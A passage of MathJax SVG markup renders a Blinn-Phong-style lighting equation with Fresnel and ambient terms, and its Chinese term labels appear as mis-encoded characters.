502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path><path id="MJX-1-TEX-I-1D439" d="M48 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H742Q749 676 749 669Q749 664 736 557T722 447Q720 440 702 440H690Q683 445 683 453Q683 454 686 477T689 530Q689 560 682 579T663 610T626 626T575 633T503 634H480Q398 633 393 631Q388 629 386 623Q385 622 352 492L320 363H375Q378 363 398 363T426 364T448 367T472 374T489 386Q502 398 511 419T524 457T529 475Q532 480 548 480H560Q567 475 567 470Q567 467 536 339T502 207Q500 200 482 200H470Q463 206 463 212Q463 215 468 234T473 274Q473 303 453 310T364 317H309L277 190Q245 66 245 60Q245 46 334 46H359Q365 40 365 39T363 19Q359 6 353 0H336Q295 2 185 2Q120 2 86 2T48 1Z"></path><path id="MJX-1-TEX-I-1D6FC" d="M34 156Q34 270 120 356T309 442Q379 442 421 402T478 304Q484 275 485 237V208Q534 282 560 374Q564 388 566 390T582 393Q603 393 603 385Q603 376 594 346T558 261T497 161L486 147L487 123Q489 67 495 47T514 26Q528 28 540 37T557 60Q559 67 562 68T577 70Q597 70 597 62Q597 56 591 43Q579 19 556 5T512 -10H505Q438 -10 414 62L411 69L400 61Q390 53 370 41T325 18T267 -2T203 -11Q124 -11 79 39T34 156ZM208 26Q257 26 306 47T379 90L403 112Q401 255 396 290Q382 405 304 405Q235 405 183 332Q156 292 139 224T121 120Q121 71 146 49T208 26Z"></path><path id="MJX-1-TEX-I-210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path><path id="MJX-1-TEX-N-38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path><path id="MJX-1-TEX-N-3A" d="M78 370Q78 394 95 412T138 430Q162 430 180 414T199 371Q199 346 182 328T139 310T96 327T78 370ZM78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"></path><path id="MJX-1-TEX-I-1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mtable"><g data-mml-node="mtr" transform="translate(0,19129.5)"><g data-mml-node="mtd" transform="translate(10974.6,0)"><g data-mml-node="mi"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g><g data-mml-node="mi" transform="translate(681,0)"><use data-c="1D456" xlink:href="#MJX-1-TEX-I-1D456"></use></g><g data-mml-node="mi" transform="translate(1026,0)"><use data-c="1D461" xlink:href="#MJX-1-TEX-I-1D461"></use></g><g data-mml-node="mi" transform="translate(1387,0)"><use data-c="1D436" xlink:href="#MJX-1-TEX-I-1D436"></use></g><g data-mml-node="mi" transform="translate(2147,0)"><use data-c="1D45C" xlink:href="#MJX-1-TEX-I-1D45C"></use></g><g data-mml-node="mi" transform="translate(2632,0)"><use data-c="1D459" xlink:href="#MJX-1-TEX-I-1D459"></use></g><g data-mml-node="mi" transform="translate(2930,0)"><use data-c="1D45C" xlink:href="#MJX-1-TEX-I-1D45C"></use></g><g data-mml-node="mi" transform="translate(3415,0)"><use data-c="1D45F" xlink:href="#MJX-1-TEX-I-1D45F"></use></g><g data-mml-node="mo" transform="translate(4143.8,0)"><use data-c="3D" xlink:href="#MJX-1-TEX-N-3D"></use></g><g data-mml-node="msub" transform="translate(5199.6,0)"><g data-mml-node="mi"><use data-c="1D450" xlink:href="#MJX-1-TEX-I-1D450"></use></g><g data-mml-node="TeXAtom" transform="translate(466,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D44E" xlink:href="#MJX-1-TEX-I-1D44E"></use></g></g></g><g data-mml-node="mo" transform="translate(6311.8,0)"><use data-c="2B" xlink:href="#MJX-1-TEX-N-2B"></use></g><g data-mml-node="msub" transform="translate(7312.1,0)"><g data-mml-node="mi"><use data-c="1D450" xlink:href="#MJX-1-TEX-I-1D450"></use></g><g data-mml-node="TeXAtom" transform="translate(466,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D451" xlink:href="#MJX-1-TEX-I-1D451"></use></g></g></g><g data-mml-node="mo" transform="translate(8418,0)"><use data-c="2B" xlink:href="#MJX-1-TEX-N-2B"></use></g><g data-mml-node="msub" transform="translate(9418.2,0)"><g data-mml-node="mi"><use data-c="1D450" xlink:href="#MJX-1-TEX-I-1D450"></use></g><g data-mml-node="TeXAtom" transform="translate(466,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D460" xlink:href="#MJX-1-TEX-I-1D460"></use></g></g></g></g></g><g data-mml-node="mtr" transform="translate(0,17729.5)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,16210.6)"><g data-mml-node="mtd"><g data-mml-node="mstyle"><rect fill="yellow" x="0" y="-360.6" width="32215.1" height="1229.5" data-bgcolor="true"></rect><g data-mml-node="mi"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g><g data-mml-node="mi" transform="translate(681,0)"><use data-c="1D456" xlink:href="#MJX-1-TEX-I-1D456"></use></g><g data-mml-node="mi" transform="translate(1026,0)"><use data-c="1D461" xlink:href="#MJX-1-TEX-I-1D461"></use></g><g data-mml-node="mi" transform="translate(1387,0)"><use data-c="1D436" xlink:href="#MJX-1-TEX-I-1D436"></use></g><g data-mml-node="mi" transform="translate(2147,0)"><use data-c="1D45C" xlink:href="#MJX-1-TEX-I-1D45C"></use></g><g data-mml-node="mi" transform="translate(2632,0)"><use data-c="1D459" xlink:href="#MJX-1-TEX-I-1D459"></use></g><g data-mml-node="mi" transform="translate(2930,0)"><use data-c="1D45C" xlink:href="#MJX-1-TEX-I-1D45C"></use></g><g data-mml-node="mi" transform="translate(3415,0)"><use data-c="1D45F" xlink:href="#MJX-1-TEX-I-1D45F"></use></g><g data-mml-node="mo" transform="translate(4143.8,0)"><use data-c="3D" xlink:href="#MJX-1-TEX-N-3D"></use></g><g data-mml-node="msub" transform="translate(5199.6,0)"><g data-mml-node="mi"><use data-c="1D434" xlink:href="#MJX-1-TEX-I-1D434"></use></g><g data-mml-node="TeXAtom" transform="translate(783,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g></g></g><g data-mml-node="mo" transform="translate(6736.3,0)"><use data-c="2297" xlink:href="#MJX-1-TEX-N-2297"></use></g><g data-mml-node="msub" transform="translate(7736.5,0)"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="TeXAtom" transform="translate(911,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D451" xlink:href="#MJX-1-TEX-I-1D451"></use></g></g></g><g data-mml-node="mo" transform="translate(9287.5,0)"><use data-c="2B" xlink:href="#MJX-1-TEX-N-2B"></use></g><g data-mml-node="mi" transform="translate(10287.7,0)"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="mi" transform="translate(11165.7,0)"><use data-c="1D44E" xlink:href="#MJX-1-TEX-I-1D44E"></use></g><g data-mml-node="mi" transform="translate(11694.7,0)"><use data-c="1D465" xlink:href="#MJX-1-TEX-I-1D465"></use></g><g data-mml-node="mo" transform="translate(12266.7,0)"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="mi" transform="translate(12655.7,0)"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g><g data-mml-node="mo" transform="translate(13558.9,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="mi" transform="translate(14059.1,0)"><use data-c="1D45B" xlink:href="#MJX-1-TEX-I-1D45B"></use></g><g data-mml-node="mo" transform="translate(14659.1,0)"><use data-c="2C" xlink:href="#MJX-1-TEX-N-2C"></use></g><g data-mml-node="mn" transform="translate(15103.8,0)"><use data-c="30" xlink:href="#MJX-1-TEX-N-30"></use></g><g data-mml-node="mo" transform="translate(15603.8,0)"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="mo" transform="translate(16215,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="msub" transform="translate(16715.2,0)"><g data-mml-node="mi"><use data-c="1D435" xlink:href="#MJX-1-TEX-I-1D435"></use></g><g data-mml-node="TeXAtom" transform="translate(792,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g></g></g><g data-mml-node="mo" transform="translate(18261,0)"><use data-c="2297" xlink:href="#MJX-1-TEX-N-2297"></use></g><g data-mml-node="mo" transform="translate(19261.2,0)"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="msub" transform="translate(19650.2,0)"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="TeXAtom" transform="translate(911,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D451" xlink:href="#MJX-1-TEX-I-1D451"></use></g></g></g><g data-mml-node="mo" transform="translate(21201.1,0)"><use data-c="2B" xlink:href="#MJX-1-TEX-N-2B"></use></g><g data-mml-node="msub" transform="translate(22201.4,0)"><g data-mml-node="mi"><use data-c="1D445" xlink:href="#MJX-1-TEX-I-1D445"></use></g><g data-mml-node="TeXAtom" transform="translate(792,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D439" xlink:href="#MJX-1-TEX-I-1D439"></use></g></g></g><g data-mml-node="mo" transform="translate(23573,0)"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="msub" transform="translate(23962,0)"><g data-mml-node="mi"><use data-c="1D6FC" xlink:href="#MJX-1-TEX-I-1D6FC"></use></g><g data-mml-node="TeXAtom" transform="translate(673,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g></g></g><g data-mml-node="mo" transform="translate(25092.3,0)"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="mfrac" transform="translate(25481.3,0)"><g data-mml-node="mrow" transform="translate(220,398) scale(0.707)"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="mo" transform="translate(878,0)"><use data-c="2B" xlink:href="#MJX-1-TEX-N-2B"></use></g><g data-mml-node="mn" transform="translate(1656,0)"><use data-c="38" xlink:href="#MJX-1-TEX-N-38"></use></g></g><g data-mml-node="mn" transform="translate(805.5,-345) scale(0.707)"><use data-c="38" xlink:href="#MJX-1-TEX-N-38"></use></g><rect width="1724.5" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(27445.8,0)"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="mi" transform="translate(27834.8,0)"><use data-c="1D45B" xlink:href="#MJX-1-TEX-I-1D45B"></use></g><g data-mml-node="mo" transform="translate(28657,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="mi" transform="translate(29157.2,0)"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g><g data-mml-node="msup" transform="translate(29733.2,0)"><g data-mml-node="mo"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g></g></g><g data-mml-node="mo" transform="translate(30826.1,0)"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="mstyle" transform="translate(31215.1,0)"><g data-mml-node="mspace"></g></g></g></g></g><g data-mml-node="mtr" transform="translate(0,14700)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,13300)"><g data-mml-node="mtd" transform="translate(11850.3,0)"><g data-mml-node="mi"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g><g data-mml-node="mo" transform="translate(958.8,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mi" transform="translate(1514.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">æŒ‡</text></g><g data-mml-node="mi" transform="translate(2514.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å‘</text></g><g data-mml-node="mi" transform="translate(3514.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å…‰</text></g><g data-mml-node="mi" transform="translate(4514.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">æº</text></g><g data-mml-node="mi" transform="translate(5514.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">çš„</text></g><g data-mml-node="mi" transform="translate(6514.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å‘</text></g><g data-mml-node="mi" transform="translate(7514.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é‡</text></g></g></g><g data-mml-node="mtr" transform="translate(0,11900)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,10500)"><g data-mml-node="mtd" transform="translate(13390.8,0)"><g data-mml-node="mi"><use data-c="1D45B" xlink:href="#MJX-1-TEX-I-1D45B"></use></g><g data-mml-node="mo" transform="translate(877.8,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mi" transform="translate(1433.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">è¡¨</text></g><g data-mml-node="mi" transform="translate(2433.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é¢</text></g><g data-mml-node="mi" transform="translate(3433.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">æ³•</text></g><g data-mml-node="mi" transform="translate(4433.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">çº¿</text></g></g></g><g data-mml-node="mtr" transform="translate(0,9100)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,7700)"><g data-mml-node="mtd" transform="translate(7902.8,0)"><g data-mml-node="mi"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g><g data-mml-node="mo" transform="translate(853.8,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mi" transform="translate(1409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å…‰</text></g><g data-mml-node="mi" transform="translate(2409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å‘</text></g><g data-mml-node="mi" transform="translate(3409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é‡</text></g><g data-mml-node="mi" transform="translate(4409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å’Œ</text></g><g data-mml-node="mi" transform="translate(5409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">è§‚</text></g><g data-mml-node="mi" transform="translate(6409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å¯Ÿ</text></g><g data-mml-node="mi" transform="translate(7409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å‘</text></g><g data-mml-node="mi" transform="translate(8409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é‡</text></g><g data-mml-node="mi" transform="translate(9409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ä¹‹</text></g><g data-mml-node="mi" transform="translate(10409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é—´</text></g><g data-mml-node="mi" transform="translate(11409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">çš„</text></g><g data-mml-node="mi" transform="translate(12409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ä¸­</text></g><g data-mml-node="mi" transform="translate(13409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é—´</text></g><g data-mml-node="mi" transform="translate(14409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å‘</text></g><g data-mml-node="mi" transform="translate(15409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é‡</text></g></g></g><g data-mml-node="mtr" transform="translate(0,6300)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,4900)"><g data-mml-node="mtd" transform="translate(12033.5,0)"><g data-mml-node="msub"><g data-mml-node="mi"><use data-c="1D434" xlink:href="#MJX-1-TEX-I-1D434"></use></g><g data-mml-node="TeXAtom" transform="translate(783,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g></g></g><g data-mml-node="mo" transform="translate(1592.3,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mi" transform="translate(2148.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å…¥</text></g><g data-mml-node="mi" transform="translate(3148.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å°„</text></g><g data-mml-node="mi" transform="translate(4148.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ç¯</text></g><g data-mml-node="mi" transform="translate(5148.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å¢ƒ</text></g><g data-mml-node="mi" transform="translate(6148.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å…‰</text></g><g data-mml-node="mi" transform="translate(7148.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é‡</text></g></g></g><g data-mml-node="mtr" transform="translate(0,3500)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,2100)"><g data-mml-node="mtd" transform="translate(12029,0)"><g data-mml-node="msub"><g data-mml-node="mi"><use data-c="1D435" xlink:href="#MJX-1-TEX-I-1D435"></use></g><g data-mml-node="TeXAtom" transform="translate(792,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g></g></g><g data-mml-node="mo" transform="translate(1601.3,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mi" transform="translate(2157.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å…¥</text></g><g data-mml-node="mi" transform="translate(3157.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å°„</text></g><g data-mml-node="mi" transform="translate(4157.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ç›´</text></g><g data-mml-node="mi" transform="translate(5157.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å°„</text></g><g data-mml-node="mi" transform="translate(6157.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å…‰</text></g><g data-mml-node="mi" transform="translate(7157.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é‡</text></g></g></g><g data-mml-node="mtr" transform="translate(0,700)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,-700)"><g data-mml-node="mtd" transform="translate(8026.4,0)"><g data-mml-node="msub"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="TeXAtom" transform="translate(911,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D451" xlink:href="#MJX-1-TEX-I-1D451"></use></g></g></g><g data-mml-node="mo" transform="translate(1606.5,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mi" transform="translate(2162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">æ ¹</text></g><g data-mml-node="mi" transform="translate(3162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">æ®</text></g><g data-mml-node="mi" transform="translate(4162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">è¡¨</text></g><g data-mml-node="mi" transform="translate(5162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é¢</text></g><g data-mml-node="mi" transform="translate(6162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å</text></g><g data-mml-node="mi" transform="translate(7162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å°„</text></g><g data-mml-node="mi" transform="translate(8162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ç‡</text></g><g data-mml-node="mi" transform="translate(9162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å</text></g><g data-mml-node="mi" transform="translate(10162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å°„</text></g><g data-mml-node="mi" transform="translate(11162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">çš„</text></g><g data-mml-node="mi" transform="translate(12162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å…¥</text></g><g data-mml-node="mi" transform="translate(13162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å°„</text></g><g data-mml-node="mi" transform="translate(14162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å…‰</text></g><g data-mml-node="mi" transform="translate(15162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é‡</text></g></g></g><g data-mml-node="mtr" transform="translate(0,-2100)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,-3500)"><g data-mml-node="mtd" transform="translate(11689,0)"><g data-mml-node="mi"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g><g data-mml-node="mo" transform="translate(903.2,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="mi" transform="translate(1403.4,0)"><use data-c="1D45B" xlink:href="#MJX-1-TEX-I-1D45B"></use></g><g data-mml-node="mo" transform="translate(2281.2,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mi" transform="translate(2837,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">æœ—</text></g><g data-mml-node="mi" transform="translate(3837,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ä¼¯</text></g><g data-mml-node="mi" transform="translate(4837,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ä½™</text></g><g data-mml-node="mi" transform="translate(5837,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å¼¦</text></g><g data-mml-node="mi" transform="translate(6837,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å®š</text></g><g data-mml-node="mi" transform="translate(7837,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ç†</text></g></g></g><g data-mml-node="mtr" transform="translate(0,-4900)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,-6300)"><g data-mml-node="mtd" transform="translate(7997.1,0)"><g data-mml-node="msub"><g data-mml-node="mi"><use data-c="1D6FC" xlink:href="#MJX-1-TEX-I-1D6FC"></use></g><g data-mml-node="TeXAtom" transform="translate(673,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g></g></g><g data-mml-node="mo" transform="translate(1408.1,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mi" transform="translate(1963.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ä¸­</text></g><g data-mml-node="mi" transform="translate(2963.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é—´</text></g><g data-mml-node="mi" transform="translate(3963.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å‘</text></g><g data-mml-node="mi" transform="translate(4963.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é‡</text></g><g data-mml-node="mi" transform="translate(5963.8,0)"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g><g data-mml-node="mi" transform="translate(6539.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ä¸</text></g><g data-mml-node="mi" transform="translate(7539.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å…‰</text></g><g data-mml-node="mi" transform="translate(8539.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å‘</text></g><g data-mml-node="mi" transform="translate(9539.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é‡</text></g><g data-mml-node="mi" transform="translate(10539.8,0)"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g><g data-mml-node="mi" transform="translate(11220.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ä¹‹</text></g><g data-mml-node="mi" transform="translate(12220.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é—´</text></g><g data-mml-node="mi" transform="translate(13220.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">çš„</text></g><g data-mml-node="mi" 